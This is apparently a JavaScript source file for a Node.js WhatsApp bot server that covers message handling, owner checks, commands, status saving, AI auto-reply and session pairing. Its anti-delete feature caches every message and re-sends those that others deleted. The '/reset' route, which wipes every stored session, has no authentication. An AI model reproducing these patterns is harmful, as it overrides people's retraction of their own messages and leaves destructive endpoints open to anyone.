function resolveOriginalSender(msg, chatJid, isGroup, myBotJid) {
  if (msg.key.fromMe) return myBotJid;
  if (isGroup) {
    return msg.key?.participant || msg.participant || '';
  }
  return chatJid;
}

async function resolveLidToRealJid(sock, originalSender) {
  if (!originalSender) return '';
  if (!originalSender.endsWith('@lid') || !sock.signalRepository?.lidToJid) {
    return originalSender;
  }
  try {
    const resolved = await sock.signalRepository.lidToJid(originalSender);
    return resolved || originalSender;
  } catch (e) {
    return originalSender;
  }
}

function isOwnerJid(jid) {
  if (!jid) return false;
  const str = String(jid).toLowerCase();
  return OWNER_NUMBERS.some(owner => str.includes(owner.toLowerCase()));
}

function checkIsOwner(originalSender, resolvedSender) {
  return isOwnerJid(originalSender) || isOwnerJid(resolvedSender);
}

function checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum) {
  return isOwner || msg.key.fromMe || (Boolean(myBotNum) && cleanSenderNum === myBotNum);
}

function shouldSkipDueToWorkMode(isAuthorized, isGroup, workMode) {
  if (isAuthorized) return false;
  const mode = String(workMode || 'public').toLowerCase().trim();
  if (mode === 'public') return false;
  if (mode === 'private' || mode === 'self') return true;
  if ((mode === 'groups' || mode === 'group') && !isGroup) return true;
  if (mode === 'inbox' && isGroup) return true;
  return false;
}

function unwrapMessageContent(message) {
  return (
    message?.ephemeralMessage?.message ||
    message?.viewOnceMessage?.message ||
    message?.viewOnceMessageV2?.message ||
    message?.documentWithCaptionMessage?.message ||
    message
  );
}

function extractMessageText(rawMsg) {
  return (
    rawMsg?.conversation ||
    rawMsg?.extendedTextMessage?.text ||
    rawMsg?.imageMessage?.caption ||
    rawMsg?.videoMessage?.caption ||
    rawMsg?.buttonsResponseMessage?.selectedButtonId ||
    rawMsg?.templateButtonReplyMessage?.selectedId ||
    ''
  ).trim();
}

function buildSafeReply(sock, chatJid, msg) {
  return async (content) => {
    let replyPayload = typeof content === 'string' ? { text: content } : { ...content };
    
    replyPayload.contextInfo = {
      ...(replyPayload.contextInfo || {}),
      ...(global.channelContext?.contextInfo || {})
    };

    try {
      return await sock.sendMessage(chatJid, replyPayload, { quoted: msg });
    } catch (e) {
      return await sock.sendMessage(chatJid, replyPayload);
    }
  };
}

function isSettingsMenuOption(cleanInput) {
  return (
    /^([1-9]|1[0-2])(\.[1-4])?$/.test(cleanInput) ||
    cleanInput.startsWith('6 ') ||
    cleanInput.startsWith('pin ') ||
    cleanInput.startsWith('set ') ||
    cleanInput.startsWith('antidel ')
  );
}

function extractQuotedCaption(quotedMsgObj) {
  return (
    quotedMsgObj?.imageMessage?.caption ||
    quotedMsgObj?.videoMessage?.caption ||
    quotedMsgObj?.conversation ||
    quotedMsgObj?.extendedTextMessage?.text ||
    ''
  );
}

function isQuotedFromSettingsMenu(quotedCaption) {
  const cap = quotedCaption.toUpperCase();
  return (
    cap.includes('SYSTEM SETTINGS') ||
    cap.includes('WORK MODE') ||
    cap.includes('FAKE ACTION') ||
    cap.includes('AI AUTO CHAT') ||
    cap.includes('ANTI-DELETE') ||
    cap.includes('ANTI DELETE')
  );
}

function isQuotedFromMainMenu(quotedCaption) {
  return (
    quotedCaption.includes('COMMAND CATEGORIES') ||
    quotedCaption.includes('DOWNLOAD MENU') ||
    (quotedCaption.includes('USER PROFILE') && quotedCaption.includes('Prefix'))
  );
}

async function handleSettingsMenuReply(sock, msg, cleanInput, chatJid, safeReply, isAuthorized, myBotNum) {
  const settingsCmd = findCommand('settings', 'setting', 'set');
  if (!settingsCmd) return false;
  const cmdFunc = getCommandExecutor(settingsCmd);
  if (!cmdFunc) return false;

  clearSettingsCache(myBotNum);
  await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
  return true;
}

async function handleStatusSaveKeyword(sock, msg, cleanInput, chatJid, safeReply, isAuthorized) {
  const statusCmd = findCommand('save', 'status');
  if (!statusCmd) return false;
  const cmdFunc = getCommandExecutor(statusCmd);
  if (!cmdFunc) return false;

  await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
  return true;
}

async function handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum) {
  const prefixMatch = text.match(/^[./!#]/);
  if (!prefixMatch) return false;

  const prefix = prefixMatch[0];
  const args = text.slice(prefix.length).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();

  // 🛡️ ANTI-DELETE COMMAND DIRECT
  if (['antidel', 'antidelete'].includes(commandName)) {
    if (!isAuthorized) {
      await safeReply('⚠️ Settings වෙනස් කළ හැක්කේ Bot හිමිකරුට (Owner) පමණි.');
      return true;
    }

    const sub = args[0]?.toLowerCase();
    const val = args[1]?.toLowerCase();

    if (!sub) {
      const current = await getBotSettings(myBotNum);
      return safeReply(
        `*🛡️ ANTI-DELETE SETTINGS*\n\n` +
        `• Status: *${current.antiDeleteEnabled ? 'ON 🟢' : 'OFF 🔴'}*\n` +
        `• Scope: *${(current.antiDeleteType || 'all').toUpperCase()}* (inbox | group | all)\n` +
        `• Send To: *${(current.antiDeleteDest || 'me').toUpperCase()}* (me | from)\n\n` +
        `*Commands:*\n` +
        `• \`${prefix}antidel on/off\`\n` +
        `• \`${prefix}antidel type inbox/group/all\`\n` +
        `• \`${prefix}antidel to me/from\``
      );
    }

    if (sub === 'on' || sub === 'off') {
      const state = sub === 'on';
      await SettingsModel.findByIdAndUpdate(myBotNum, { antiDeleteEnabled: state }, { upsert: true });
      clearSettingsCache(myBotNum);
      return safeReply(`✅ Anti-Delete status set to *${sub.toUpperCase()}*`);
    }

    if (sub === 'type') {
      if (!['inbox', 'group', 'all'].includes(val)) {
        return safeReply('❌ Invalid type! Choose: `inbox`, `group`, or `all`');
      }
      await SettingsModel.findByIdAndUpdate(myBotNum, { antiDeleteType: val }, { upsert: true });
      clearSettingsCache(myBotNum);
      return safeReply(`✅ Anti-Delete scope set to: *${val.toUpperCase()}*`);
    }

    if (sub === 'to' || sub === 'dest') {
      if (!['me', 'from'].includes(val)) {
        return safeReply('❌ Invalid destination! Choose: `me` or `from`');
      }
      await SettingsModel.findByIdAndUpdate(myBotNum, { antiDeleteDest: val }, { upsert: true });
      clearSettingsCache(myBotNum);
      return safeReply(`✅ Target chat set to: *${val.toUpperCase()}*`);
    }

    return safeReply('❌ Invalid argument. Type `' + prefix + 'antidel`');
  }

  const isSettingsCmd = ['setting', 'settings', 'set', 'config'].includes(commandName);

  if (isSettingsCmd && !isAuthorized) {
    await safeReply('⚠️ Settings වෙනස් කළ හැක්කේ Bot හිමිකරුට (Owner) පමණි.');
    return true;
  }

  if (shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
    return true;
  }

  let targetCmd = commands.get(commandName);
  if (!targetCmd && isSettingsCmd) targetCmd = findCommand('settings', 'setting', 'set');
  if (!targetCmd) return false;

  try {
    const cmdFunc = getCommandExecutor(targetCmd);
    if (cmdFunc) {
      if (isSettingsCmd) clearSettingsCache(myBotNum);
      await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner: isAuthorized, isGroup });
    }
  } catch (err) {
    console.error(`Command [${commandName}] execution error:`, err?.message);
  }
  return true;
}

// ============================================================================
// 🛡️ ANTI-DELETE DISPATCHER (TEXT & MEDIA FORWARD ENGINE)
// ============================================================================

async function triggerAntiDelete(sock, deletedKey, cachedMsg, phoneNumber) {
  try {
    const myBotJid = sock.user?.id || '';
    const myBotNum = myBotJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') || phoneNumber.replace(/[^0-9]/g, '');
    const settings = await getBotSettings(myBotNum);

    if (!settings.antiDeleteEnabled) return;

    const chatJid = deletedKey.remoteJid;
    const isGroup = chatJid.endsWith('@g.us');

    if (settings.antiDeleteType === 'inbox' && isGroup) return;
    if (settings.antiDeleteType === 'group' && !isGroup) return;

    const sender = cachedMsg.key.participant || cachedMsg.key.remoteJid;
    const senderClean = sender.split('@')[0].split(':')[0];

    const targetJid = settings.antiDeleteDest === 'from'
      ? chatJid
      : myBotJid.split(':')[0] + '@s.whatsapp.net';

    const alertText = 
      `*🛡️ ANTI-DELETE DETECTED 🛡️*\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `👤 *Sender:* @${senderClean}\n` +
      `📍 *Chat:* ${isGroup ? 'Group Chat' : 'Inbox (Private)'}\n` +
      `⏰ *Time:* ${new Date().toLocaleTimeString('en-US', { timeZone: 'Asia/Colombo' })}\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `> *Deleted Message Content:*`;

    // 1. Alert info එක යැවීම
    await sock.sendMessage(targetJid, {
      text: alertText,
      mentions: [sender],
      ...global.channelContext
    });

    // 2. Original Deleted Message Content එක යැවීම
    const rawContent = unwrapMessageContent(cachedMsg.message);
    const textBody = rawContent?.conversation || rawContent?.extendedTextMessage?.text;

    if (textBody) {
      await sock.sendMessage(targetJid, { text: `💬 *Deleted Text:*\n\n${textBody}` });
    } else {
      try {
        await sock.sendMessage(targetJid, { forward: cachedMsg, ...global.channelContext });
      } catch (e) {
        await sock.sendMessage(targetJid, rawContent);
      }
    }
  } catch (err) {
    console.error('Anti-delete trigger error:', err?.message);
  }
}

// ============================================================================
// 💬 SINGLE MESSAGE PROCESSOR
// ============================================================================

async function processSingleMessage(sock, msg, phoneNumber) {
  if (!msg || !msg.message) return;
  const chatJid = msg.key?.remoteJid;
  if (!chatJid) return;

  // 🛡️ Always Cache Incoming Messages in Global Memory
  if (chatJid !== 'status@broadcast' && msg.key?.id) {
    // Protocol Message (Revoke) එකක් හරහා මැසේජ් එක ඩිලීට් කළාද බැලීම
    const isProtocolRevoke = msg.message?.protocolMessage?.type === 0;
    if (isProtocolRevoke && msg.message?.protocolMessage?.key?.id) {
      const revKey = msg.message.protocolMessage.key;
      const cachedRevMsg = globalMsgStore.get(revKey.id);
      if (cachedRevMsg) {
        await triggerAntiDelete(sock, revKey, cachedRevMsg, phoneNumber);
        return;
      }
    }

    // Normal message එක cache කරගැනීම
    globalMsgStore.set(msg.key.id, JSON.parse(JSON.stringify(msg)));
  }

  if (chatJid === UPDATE_CHANNEL_JID || chatJid.endsWith('@newsletter')) {
    if (!msg.message.reactionMessage) reactToChannelPost(sock, msg, chatJid);
    return;
  }

  if (msg.message.reactionMessage) return;

  const isGroup = chatJid.endsWith('@g.us');
  const myBotJid = sock.user?.id || '';
  const myBotNum = myBotJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') || phoneNumber.replace(/[^0-9]/g, '');
  const settings = await getBotSettings(myBotNum);

  if (settings.autoChatRead && !msg.key.fromMe) {
    sock.readMessages([msg.key]).catch(() => {});
  }

  if (!msg.key.fromMe) simulateAutoPresence(sock, chatJid, settings);

  if (chatJid === 'status@broadcast') {
    await handleStatusBroadcast(sock, msg, settings);
    return;
  }

  const originalSender = resolveOriginalSender(msg, chatJid, isGroup, myBotJid);
  const resolvedSender = await resolveLidToRealJid(sock, originalSender);
  const isOwner = checkIsOwner(originalSender, resolvedSender);

  const cleanSenderNum = (resolvedSender || originalSender || '').split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
  const isAuthorized = checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum);
  const currentMode = settings.workMode || 'public';

  const rawMsg = unwrapMessageContent(msg.message);
  const text = extractMessageText(rawMsg);
  if (!text) return;

  const quotedContext = msg.message?.extendedTextMessage?.contextInfo;
  const quotedMsgObj = quotedContext?.quotedMessage;
  const safeReply = buildSafeReply(sock, chatJid, msg);
  const cleanInput = text.toLowerCase().trim();

  const settingsOption = isSettingsMenuOption(cleanInput);
  const quotedCaption = extractQuotedCaption(quotedMsgObj);
  const fromSettingsMenu = isQuotedFromSettingsMenu(quotedCaption);
  const fromMainMenu = isQuotedFromMainMenu(quotedCaption);

  // 🎯 1. MAIN MENU QUOTED REPLY HANDLER
  if (quotedMsgObj && fromMainMenu && ['1', '2', '3', '4'].includes(cleanInput)) {
    if (!shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
      const menuCmd = findCommand('menu', 'help', 'list');
      if (menuCmd) {
        const cmdFunc = getCommandExecutor(menuCmd);
        if (cmdFunc) {
          await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized, isGroup });
          return;
        }
      }
    }
  }

  // 🎯 2. SETTINGS MENU REPLY HANDLER
  if (settingsOption && isAuthorized && fromSettingsMenu && !fromMainMenu) {
    const handled = await handleSettingsMenuReply(sock, msg, cleanInput, chatJid, safeReply, isAuthorized, myBotNum);
    if (handled) return;
  }

  // 🎯 3. STATUS SAVE HANDLER
  const statusKeywords = ['oni', 'ඕනි', 'ඕනෙ', 'dapan', 'දාපන්', 'ewanna', 'එවන්න', 'save', 'status', 'send'];
  const isQuotedFromStatus = quotedContext?.remoteJid === 'status@broadcast' || quotedContext?.participant?.includes('@broadcast');

  if (quotedMsgObj && (isQuotedFromStatus || statusKeywords.includes(cleanInput))) {
    if (statusKeywords.includes(cleanInput)) {
      const handled = await handleStatusSaveKeyword(sock, msg, cleanInput, chatJid, safeReply, isAuthorized);
      if (handled) return;
    }
  }

  // 🎯 4. PREFIX COMMANDS HANDLER
  const isCmdHandled = await handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum);
  if (isCmdHandled) return;

  // 🎯 5. AI AUTO CHAT HANDLER
  if (settings.aiChatEnabled && !msg.key.fromMe) {
    if (!shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
      await sock.sendPresenceUpdate('composing', chatJid).catch(() => {});
      const aiReply = await askAI(text, originalSender || chatJid);
      if (aiReply) {
        await sock.sendMessage(chatJid, { text: aiReply }, { quoted: msg }).catch(() => {});
      }
    }
  }
}

function registerMessageUpsertHandler(sock, phoneNumber) {
  sock.ev.on('messages.upsert', ({ messages }) => {
    if (!messages || !messages.length) return;
    for (const msg of messages) {
      processSingleMessage(sock, msg, phoneNumber).catch(() => {});
    }
  });
}

// 🛡️ Baileys Revoke Event Listener
function registerMessageUpdateHandler(sock, phoneNumber) {
  sock.ev.on('messages.update', async (updates) => {
    for (const update of updates) {
      try {
        const isRevoke =
          update.update?.messageStubType === WAMessageStubType.REVOKE ||
          update.update?.messageStubType === 68 ||
          update.update?.message?.protocolMessage?.type === 0;

        if (!isRevoke) continue;

        const deletedKey = update.key;
        if (!deletedKey || !deletedKey.id) continue;

        const cachedMsg = globalMsgStore.get(deletedKey.id);
        if (!cachedMsg || !cachedMsg.message) continue;

        await triggerAntiDelete(sock, deletedKey, cachedMsg, phoneNumber);
      } catch (err) {
        console.error('Anti-delete update handler error:', err?.message);
      }
    }
  });
}

// ============================================================================
// 🚀 MAIN WHATSAPP INITIALIZER
// ============================================================================

async function initWhatsApp(phoneNumber) {
  if (activeSessions[phoneNumber]) return activeSessions[phoneNumber];
  if (isStarting[phoneNumber]) return;
  isStarting[phoneNumber] = true;

  try {
    const { sock, clearSessionData } = await createBaileysSocket(phoneNumber);
    activeSessions[phoneNumber] = sock;
    delete isStarting[phoneNumber];

    registerConnectionUpdateHandler(sock, phoneNumber, clearSessionData);
    registerMessageUpsertHandler(sock, phoneNumber);
    registerMessageUpdateHandler(sock, phoneNumber);

    return sock;
  } catch (err) {
    delete isStarting[phoneNumber];
    console.error(`initWhatsApp Error (${phoneNumber}):`, err.message);
  }
}

// ============================================================================
// 🌐 HTTP ROUTES
// ============================================================================

function stopAndRemoveSession(num) {
  if (!activeSessions[num]) return;
  try {
    activeSessions[num].ev.removeAllListeners();
    activeSessions[num].ws?.close();
  } catch (e) {}
  delete activeSessions[num];
}

function registerResetAllRoute(app) {
  app.get('/reset', async (req, res) => {
    try {
      await Auth.deleteMany({});
      if (mongoose.connection.db) {
        await mongoose.connection.db.collection('auths').deleteMany({});
      }
      Object.keys(activeSessions).forEach(num => {
        stopAndRemoveSession(num);
      });
      settingsCache.flushAll();
      res.json({ success: true, message: 'All sessions successfully wiped!' });
    } catch (err) {
      res.status(500).json({ success: false, error: err.message });
    }
  });
}

function registerResetSingleNumberRoute(app) {
  app.get('/reset-num', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Number required' });
    num = num.replace(/[^0-9]/g, '');

    try {
      stopAndRemoveSession(num);
      delete isStarting[num];
      await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
      clearSettingsCache(num);
      return res.json({ success: true, message: `Session cleared for ${num}` });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  });
}

function registerPairRoute(app) {
  app.get('/pair', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Phone number is required!' });
    
    num = num.replace(/[^0-9]/g, '');
    if (num.length < 10) {
      return res.status(400).json({ error: 'Invalid phone number format!' });
    }

    stopAndRemoveSession(num);
    delete isStarting[num];

    try {
      await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
      await SettingsModel.findByIdAndUpdate(num, { $set: { isFirstConnectDone: false } }, { upsert: true }).catch(() => {});
      clearSettingsCache(num);
    } catch (e) {
      console.error('Session reset error:', e.message);
    }

    let pairSock = null;

    try {
      const { state, saveCreds, clearSessionData } = await useMongoDBAuthState(num);
      const logger = pino({ level: 'silent' });

      pairSock = makeWASocket({
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
        logger,
        printQRInTerminal: false,
        browser: Browsers.ubuntu('Chrome'),
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 25000,
        markOnlineOnConnect: false,
        emitOwnEvents: false
      });

      pairSock.ev.on('creds.update', saveCreds);

      pairSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'open') {
          activeSessions[num] = pairSock;
          registerConnectionUpdateHandler(pairSock, num, clearSessionData);
          registerMessageUpsertHandler(pairSock, num);
          registerMessageUpdateHandler(pairSock, num);
          handleConnectionOpen(pairSock, num);
        } else if (connection === 'close') {
          const code = lastDisconnect?.error?.output?.statusCode;
          if (code !== DisconnectReason.loggedOut && code !== 401) {
            setTimeout(() => initWhatsApp(num), 6000);
          }
        }
      });

      await delay(3000);

      if (!pairSock.authState.creds.registered) {
        let code = await pairSock.requestPairingCode(num);
        code = code?.match(/.{1,4}/g)?.join('-') || code;
        return res.json({ code });
      } else {
        await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
        return res.status(400).json({ error: 'Session conflict detected. Please click button again!' });
      }
    } catch (err) {
      console.error(`❌ Pairing Error for ${num}:`, err?.message || err);
      if (pairSock) {
        try {
          pairSock.ev.removeAllListeners();
          pairSock.ws?.close();
        } catch (e) {}
      }
      return res.status(500).json({ 
        error: 'Pairing code generation failed. WhatsApp server rate-limit or network delay. Wait 15 seconds and retry.' 
      });
    }
  });
}

function registerAllHttpRoutes(app) {
  registerPortalRoute(app);
  registerResetAllRoute(app);
  registerResetSingleNumberRoute(app);
  registerPairRoute(app);
}

// ============================================================================
// 🔁 KEEP-ALIVE (WAKE SERVER EVERY 2 MINUTES)
// ============================================================================

function startKeepAlivePing() {
  const keepAliveUrl = process.env.RENDER_EXTERNAL_URL;
  if (!keepAliveUrl) return;

  setInterval(async () => {
    try {
      await fetch(keepAliveUrl);
    } catch (e) {}
  }, 2 * 60 * 1000);
}

// ============================================================================
// 🍃 STARTUP
// ============================================================================

async function reconnectAllSavedSessions() {
  try {
    const sessions = await Auth.find({ _id: /-creds$/ }).lean();
    console.log(`🔍 Found ${sessions.length} saved sessions in Database.`);

    for (const session of sessions) {
      const pNumber = session._id.split('-creds')[0];
      await initWhatsApp(pNumber);
      await delay(10000);
    }
  } catch (e) {
    console.error('Error reconnecting sessions:', e.message);
  }
}

async function startServer() {
  const app = express();
  const port = process.env.PORT || 3000;
  app.use(express.json());

  loadAllCommands();
  registerAllHttpRoutes(app);

  app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
    startKeepAlivePing();
  });

  await reconnectAllSavedSessions();
}

async function main() {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log('🍃 MongoDB Connected!');
    await startServer();
  } catch (err) {
    console.error('MongoDB Connection Error:', err);
  }
}

main();
